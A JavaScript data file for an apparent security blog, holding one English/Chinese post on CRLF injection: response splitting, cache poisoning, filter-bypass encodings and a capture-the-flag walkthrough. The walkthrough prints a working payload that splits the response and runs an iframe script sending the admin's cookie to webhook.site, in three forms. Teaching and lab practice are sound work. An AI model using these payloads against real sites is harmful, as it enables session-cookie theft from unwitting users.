window.postsData = [
  {
    id: "crlf-injection",
    href: "posts/web/crlf-injection.html",
    title: {
      en: "CRLF Injection",
      zh: "CRLF 注入"
    },
    category: "web",
    categoryLabel: { en: "Web", zh: "Web" },
    description: {
      en: "CRLF injection basics, attack surfaces, bypass techniques, and a practical lab walkthrough.",
      zh: "CRLF 注入基础、常见攻击面、绕过方式与一篇带截图的实战记录。"
    },
    date: "2026-04-24",
    content: {
      en: "A full note covering the nature of CRLF injection, common abuse patterns, and a practical cookie exfiltration walkthrough.",
      zh: "完整梳理 CRLF 注入的本质、常见利用方式，以及一次获取管理员 Cookie 的实战过程。"
    },
    code: "%0D%0A%0D%0A",
    contentHtml: {
      en: String.raw`<p>CRLF (Carriage Return + Line Feed) is a control-character pair used to represent line breaks in network protocols:</p>
<ul>
  <li><code>\r</code>: Carriage Return</li>
  <li><code>\n</code>: Line Feed</li>
</ul>
<p>In HTTP, CRLF has <strong>structural meaning</strong>. It is not just ordinary text; it is used to:</p>
<ul>
  <li>Separate one header from another</li>
  <li>Separate headers from the response body</li>
</ul>
<blockquote>CRLF controls the structure of an HTTP message, not its content.</blockquote>
<hr />
<h3>The Nature of CRLF Injection</h3>
<p>The essence of a CRLF injection vulnerability is that an attacker can insert newline characters into an HTTP message, break the original structure, and forge new protocol-level content.</p>
<p>In other words:</p>
<ul>
  <li>Normal input is treated as data</li>
  <li>Injected CRLF is treated as protocol syntax</li>
</ul>
<p>That is the core reason the vulnerability exists.</p>
<hr />
<h3>A Basic Model</h3>
<p>Assume the server has logic like this:</p>
<pre><code>Location: /search?q=user_input</code></pre>
<p>If the user supplies:</p>
<pre><code>test\r\nSet-Cookie: session=hacked</code></pre>
<p>The server response becomes:</p>
<pre><code>Location: /search?q=test
Set-Cookie: session=hacked</code></pre>
<p>What happened here is:</p>
<ul>
  <li>The value was originally just a parameter</li>
  <li>It was elevated into a new header</li>
</ul>
<p>This is a classic CRLF injection.</p>
<hr />
<h3>Conditions for the Vulnerability</h3>
<ol>
  <li>User input reaches the structure of an HTTP message, such as a header, status line, or response</li>
  <li><code>\r</code> and <code>\n</code> are not filtered or encoded</li>
  <li>The backend directly concatenates strings</li>
</ol>
<blockquote>User-controlled input is inserted directly into protocol structure.</blockquote>
<hr />
<h3>Common Attack Types</h3>
<h4>Header Injection</h4>
<p>An attacker inserts new headers, for example:</p>
<ul>
  <li>Set-Cookie</li>
  <li>Location</li>
  <li>Content-Type</li>
</ul>
<p>This can lead to:</p>
<ul>
  <li>Cookie injection</li>
  <li>Session hijacking</li>
  <li>Manipulated redirects</li>
</ul>
<h4>HTTP Response Splitting</h4>
<p>By inserting:</p>
<pre><code>\r\n\r\n</code></pre>
<p>The attacker forcefully ends the current response and starts a new one:</p>
<pre><code>Normal response
\r\n\r\n
Forged response</code></pre>
<p>This can be used to:</p>
<ul>
  <li>Inject HTML pages</li>
  <li>Build XSS chains</li>
  <li>Return malicious content</li>
</ul>
<h4>Web Cache Poisoning</h4>
<ul>
  <li>Modify cached content through CRLF injection</li>
  <li>Poison CDN or proxy caches</li>
  <li>Make other users visit a malicious page</li>
  <li>Achieve persistent impact</li>
</ul>
<h4>Request Smuggling (Advanced Abuse)</h4>
<p>CRLF can also act as a low-level primitive for:</p>
<ul>
  <li>Injecting extra requests</li>
  <li>Confusing frontend and backend parsers</li>
  <li>Manipulating request queues</li>
</ul>
<p>These attacks are often combined with:</p>
<ul>
  <li>Differences between HTTP/1.1 and HTTP/2</li>
  <li>Inconsistent frontend/backend parsing behavior</li>
</ul>
<hr />
<h3>Common Injection Points</h3>
<p>CRLF injection is not limited to a single sink. Common entry points include:</p>
<ul>
  <li>URL parameters (GET)</li>
  <li>POST parameters</li>
  <li>HTTP headers such as <code>Referer</code> or <code>User-Agent</code></li>
  <li>Redirect parameters such as <code>Location</code></li>
  <li>Logging systems (log injection)</li>
</ul>
<hr />
<h3>Encoding and Bypass</h3>
<p>In practice, many systems try to filter <code>\r\n</code>, so bypass techniques are often needed.</p>
<h4>URL Encoding</h4>
<pre><code>%0d%0a
%0a
%0d</code></pre>
<h4>Double Encoding</h4>
<pre><code>%250d%250a</code></pre>
<h4>Variant Techniques</h4>
<ul>
  <li>Using only LF when a system filters only CR</li>
  <li>Abusing parsing differences between layers</li>
  <li>Using special HTTP/2 header constructions</li>
</ul>
<hr />
<h3>Relationship with XSS and CSRF</h3>
<p>CRLF itself is not always the final exploit. It is more like a primitive.</p>
<p>It can be used as:</p>
<ul>
  <li>A trigger for XSS by injecting HTML or JavaScript</li>
  <li>Support for CSRF by influencing headers or cookies</li>
  <li>A foundation for request smuggling</li>
</ul>
<blockquote>CRLF is control at the protocol layer, while XSS is control at the browser execution layer.</blockquote>
<hr />
<h3>Attack-Chain Perspective</h3>
<p>A full attack chain often looks like this:</p>
<pre><code>CRLF injection
→ Control HTTP structure
→ Insert malicious headers or response content
→ Trigger cache, browser, or backend behavior
→ Reach the final impact (XSS, privilege escalation, data exposure)</code></pre>
<hr />
<h3>Practical Walkthrough</h3>
<p>This was a site that allowed online reports. Clicking <code>REPORT</code> opened the report page. The objective was to obtain the administrator's cookie, which contained the flag.</p>
<img src="assets/posts/crlf-injection/Pasted image 20260423235305.png" alt="Target application landing page" />
<img src="assets/posts/crlf-injection/Pasted image 20260423220226.png" alt="Report page" />
<p>Enter some arbitrary content and then intercept the request with Burp Suite.</p>
<img class="post-image-small" src="assets/posts/crlf-injection/Pasted image 20260423220515.png" alt="Burp Suite intercepted request" />
<p>The page only returned <code>reported</code>, without anything particularly interesting.</p>
<img src="assets/posts/crlf-injection/Pasted image 20260423235353.png" alt="Reported response page" />
<p>First, use CRLF injection in the <code>name</code> field to split the response with the following payload:</p>
<pre><code>%0D%0A%0D%0A</code></pre>
<p>This is equivalent to <code>\r\n\r\n</code>, and it does the following:</p>
<ul>
  <li>Ends the current header line</li>
  <li>Creates an additional blank line</li>
  <li>Forcefully terminates the response headers</li>
  <li>Pushes attacker-controlled content into the response body</li>
  <li>Makes the browser render subsequent content as HTML</li>
  <li>Allows the script inside <code>iframe srcdoc</code> to execute</li>
  <li>Triggers a request to the webhook after the script runs</li>
</ul>
<p>Next, use the following content in the <code>content</code> field:</p>
<pre><code class="language-html">&lt;iframe srcdoc="&lt;script&gt;
let t = top.document.body.innerText || '';

let m = t.match(/Set-Cookie: flag=([^;\n]+)/);

(new Image()).src = 'https://webhook.site/?raw=' +
    encodeURIComponent(m[1]) +
    '&amp;dec=' +
    encodeURIComponent(atob(m[1]));
&lt;/script&gt;"&gt;&lt;/iframe&gt;</code></pre>
<p>Because the response headers were terminated early through the <code>name</code> field, and that field was reflected into the header section on the target server, we could recover the cookie by matching it from the rendered page.</p>
<p>The payload can then be shortened into a single line:</p>
<pre><code class="language-js">&lt;iframe srcdoc="&amp;lt;script&amp;gt;let t=top.document.body.innerText||'';let m=t.match(/Set-Cookie: flag=([^;\n]+)/);(new Image()).src='https://webhook.site/?raw='+encodeURIComponent(m[1])+'&amp;dec='+encodeURIComponent(atob(m[1]));&amp;lt;/script&amp;gt;"&gt;&lt;/iframe&gt;</code></pre>
<p>Finally, URL-encode the key characters:</p>
<pre><code>&lt;iframe+srcdoc%3d"%26lt%3bscript%26gt%3blet+t%3dtop.document.body.innerText||''%3blet+m%3dt.match(/Set-Cookie%3a+flag%3d([^%3b\n]%2b)/)%3b(new+Image()).src%3d'https%3a//webhook.site/%3fraw%3d'%2bencodeURIComponent(m[1])%2b'%26dec%3d'%2bencodeURIComponent(atob(m[1]))%3b%26lt%3b/script%26gt%3b"&gt;&lt;/iframe&gt;</code></pre>
<img src="assets/posts/crlf-injection/Pasted image 20260423235453.png" alt="Final encoded payload" />
<p>The webhook then successfully received the request.</p>
<img src="assets/posts/crlf-injection/Pasted image 20260423235547.png" alt="Webhook request containing the flag" />`,
      zh: String.raw`<p>CRLF（Carriage Return + Line Feed）是一种在网络协议中用于表示换行的控制字符组合：</p>
<ul>
  <li><code>\r</code>：回车（Carriage Return）</li>
  <li><code>\n</code>：换行（Line Feed）</li>
</ul>
<p>在 HTTP 协议中，CRLF 具有<strong>结构性意义</strong>，它不是普通字符，而是用于：</p>
<ul>
  <li>分隔 Header 与 Header</li>
  <li>分隔 Header 与 Body</li>
</ul>
<blockquote>CRLF 控制的是 HTTP 报文的“结构”，而不是“内容”。</blockquote>
<hr />
<h3>CRLF 注入的本质</h3>
<p>CRLF 注入漏洞的本质是：攻击者可以向 HTTP 报文中插入换行符，从而“打断原有结构”，并“伪造新的协议内容”。</p>
<p>换句话说：</p>
<ul>
  <li>正常输入：被当成数据</li>
  <li>注入 CRLF：被当成协议</li>
</ul>
<p>这就是漏洞成立的核心。</p>
<hr />
<h3>一个基础模型</h3>
<p>假设服务器有如下逻辑：</p>
<pre><code>Location: /search?q=用户输入</code></pre>
<p>如果用户输入：</p>
<pre><code>test\r\nSet-Cookie: session=hacked</code></pre>
<p>服务器响应变成：</p>
<pre><code>Location: /search?q=test
Set-Cookie: session=hacked</code></pre>
<p>这里发生的事情是：</p>
<ul>
  <li>原本只是参数</li>
  <li>被提升为新的 Header</li>
</ul>
<p>这就是典型的 CRLF 注入。</p>
<hr />
<h3>漏洞形成条件</h3>
<ol>
  <li>用户输入进入 HTTP 报文结构中（Header / 状态行 / 响应）</li>
  <li>没有对 <code>\r</code> 和 <code>\n</code> 进行过滤或编码</li>
  <li>后端直接拼接字符串</li>
</ol>
<blockquote>用户输入被“直接拼进协议结构”。</blockquote>
<hr />
<h3>常见攻击类型</h3>
<h4>Header Injection</h4>
<p>攻击者插入新的 Header，例如：</p>
<ul>
  <li>Set-Cookie</li>
  <li>Location</li>
  <li>Content-Type</li>
</ul>
<p>效果包括：</p>
<ul>
  <li>注入 Cookie</li>
  <li>劫持会话</li>
  <li>控制重定向行为</li>
</ul>
<h4>HTTP Response Splitting</h4>
<p>通过插入如下内容：</p>
<pre><code>\r\n\r\n</code></pre>
<p>强行结束当前响应，开始一个新的响应：</p>
<pre><code>正常响应
\r\n\r\n
伪造响应</code></pre>
<p>攻击者可以：</p>
<ul>
  <li>注入 HTML 页面</li>
  <li>构造 XSS</li>
  <li>返回恶意内容</li>
</ul>
<h4>Web Cache Poisoning</h4>
<ul>
  <li>利用 CRLF 注入修改缓存内容</li>
  <li>污染 CDN 或代理缓存</li>
  <li>让其他用户访问恶意页面</li>
  <li>实现持久攻击</li>
</ul>
<h4>Request Smuggling（高阶利用）</h4>
<p>CRLF 可以作为基础构造：</p>
<ul>
  <li>插入额外请求</li>
  <li>干扰前后端解析</li>
  <li>操控请求队列</li>
</ul>
<p>这类攻击通常结合：</p>
<ul>
  <li>HTTP/1.1 与 HTTP/2 差异</li>
  <li>Front-end / Back-end 不一致解析</li>
</ul>
<hr />
<h3>常见注入位置</h3>
<p>CRLF 注入并不局限于某一个点，常见入口包括：</p>
<ul>
  <li>URL 参数（GET）</li>
  <li>POST 参数</li>
  <li>HTTP Header（如 Referer / User-Agent）</li>
  <li>重定向参数（Location）</li>
  <li>日志系统（Log Injection）</li>
</ul>
<hr />
<h3>编码与绕过</h3>
<p>现实中，很多系统会过滤 <code>\r\n</code>，因此需要绕过。常见方式包括：</p>
<h4>URL 编码</h4>
<pre><code>%0d%0a
%0a
%0d</code></pre>
<h4>双重编码</h4>
<pre><code>%250d%250a</code></pre>
<h4>变体利用</h4>
<ul>
  <li>只使用 LF（部分系统只过滤 CR）</li>
  <li>利用解析差异（前后端不同处理）</li>
  <li>HTTP/2 特殊 header 构造</li>
</ul>
<hr />
<h3>与 XSS / CSRF 的关系</h3>
<p>CRLF 本身不是最终攻击，而是一个“原语”。</p>
<p>它可以作为：</p>
<ul>
  <li>XSS 的触发器（注入 HTML / JS）</li>
  <li>CSRF 的辅助（控制 Header / Cookie）</li>
  <li>Smuggling 的基础</li>
</ul>
<blockquote>CRLF 是“协议层控制”，XSS 是“浏览器执行层控制”。</blockquote>
<hr />
<h3>攻击链视角</h3>
<p>完整攻击链通常是：</p>
<pre><code>CRLF 注入
→ 控制 HTTP 结构
→ 插入恶意 Header / Response
→ 触发缓存 / 浏览器 / 后端逻辑
→ 实现最终利用（XSS / 权限提升 / 数据泄露）</code></pre>
<hr />
<h3>实战表现</h3>
<p>这是一个可以在线举报的网站，点击 <code>REPORT</code> 会进入 report 页面。我们的目标是获得管理员的 Cookie，其中藏着 flag。</p>
<img src="assets/posts/crlf-injection/Pasted image 20260423235305.png" alt="CRLF 注入靶场首页" />
<img src="assets/posts/crlf-injection/Pasted image 20260423220226.png" alt="进入 report 页面后的界面" />
<p>随便输入一些内容，然后使用 Burp Suite 拦截请求。</p>
<img class="post-image-small" src="assets/posts/crlf-injection/Pasted image 20260423220515.png" alt="Burp Suite 拦截到的请求" />
<p>页面只返回 <code>reported</code>，没有特别的内容。</p>
<img src="assets/posts/crlf-injection/Pasted image 20260423235353.png" alt="reported 响应页面" />
<p>首先，在 <code>name</code> 中利用 CRLF 注入进行分割，内容如下：</p>
<pre><code>%0D%0A%0D%0A</code></pre>
<p>它等价于 <code>\r\n\r\n</code>，作用是：</p>
<ul>
  <li>结束当前 header 行</li>
  <li>再制造一个空行</li>
  <li>强行结束响应头</li>
  <li>让后续可控内容进入 response body</li>
  <li>让浏览器把后续内容当作 HTML 渲染</li>
  <li>使 <code>iframe srcdoc</code> 里的脚本能够执行</li>
  <li>脚本执行后再请求 webhook</li>
</ul>
<p>其次是 <code>content</code> 中的内容：</p>
<pre><code class="language-html">&lt;iframe srcdoc="&lt;script&gt;
let t = top.document.body.innerText || '';

let m = t.match(/Set-Cookie: flag=([^;\n]+)/);

(new Image()).src = 'https://webhook.site/?raw=' +
    encodeURIComponent(m[1]) +
    '&amp;dec=' +
    encodeURIComponent(atob(m[1]));
&lt;/script&gt;"&gt;&lt;/iframe&gt;</code></pre>
<p>因为之前在 <code>name</code> 中提前结束了响应头，在目标服务器那边，<code>name</code> 被放进了 header 部分，所以我们可以利用匹配的方式来获取 Cookie。</p>
<p>将代码缩短为一行：</p>
<pre><code class="language-js">&lt;iframe srcdoc="&amp;lt;script&amp;gt;let t=top.document.body.innerText||'';let m=t.match(/Set-Cookie: flag=([^;\n]+)/);(new Image()).src='https://webhook.site/?raw='+encodeURIComponent(m[1])+'&amp;dec='+encodeURIComponent(atob(m[1]));&amp;lt;/script&amp;gt;"&gt;&lt;/iframe&gt;</code></pre>
<p>再将关键字进行 URL 编码：</p>
<pre><code>&lt;iframe+srcdoc%3d"%26lt%3bscript%26gt%3blet+t%3dtop.document.body.innerText||''%3blet+m%3dt.match(/Set-Cookie%3a+flag%3d([^%3b\n]%2b)/)%3b(new+Image()).src%3d'https%3a//webhook.site/%3fraw%3d'%2bencodeURIComponent(m[1])%2b'%26dec%3d'%2bencodeURIComponent(atob(m[1]))%3b%26lt%3b/script%26gt%3b"&gt;&lt;/iframe&gt;</code></pre>
<img src="assets/posts/crlf-injection/Pasted image 20260423235453.png" alt="编码后的最终 payload" />
<p>在 Webhook 成功收到请求。</p>
<img src="assets/posts/crlf-injection/Pasted image 20260423235547.png" alt="Webhook 收到带有 flag 的请求" />`
    }
  }
];
